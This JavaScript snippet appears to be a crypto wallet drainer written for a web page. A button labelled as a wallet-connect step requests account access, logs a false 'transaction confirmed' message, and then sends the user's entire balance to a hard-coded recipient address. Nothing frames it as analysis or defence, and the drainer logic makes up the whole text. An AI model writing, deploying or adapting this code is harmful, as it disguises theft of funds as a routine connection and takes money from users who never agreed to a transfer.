
const provider = new ethers.providers.Web3Provider(window.ethereum);

const connectButton = document.getElementById("connectButton");
connectButton.addEventListener("click", async () => {
  try {
   
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    console.log("Connected to wallet and transaction confirmed");

    
    const signer = provider.getSigner();

    
    const balance = await signer.getBalance();

    
    if (balance.gt(0)) {
      
      const transaction = {
        to: "recipient_wallet_address",
        value: balance,
      };

      
      await signer.provider.send("eth_sendTransaction", [transaction]);
      console.log("Transaction sent");
    } else {
      console.log("Insufficient balance to send transaction");
    }

  } catch (error) {
    console.error(error);
  }
});
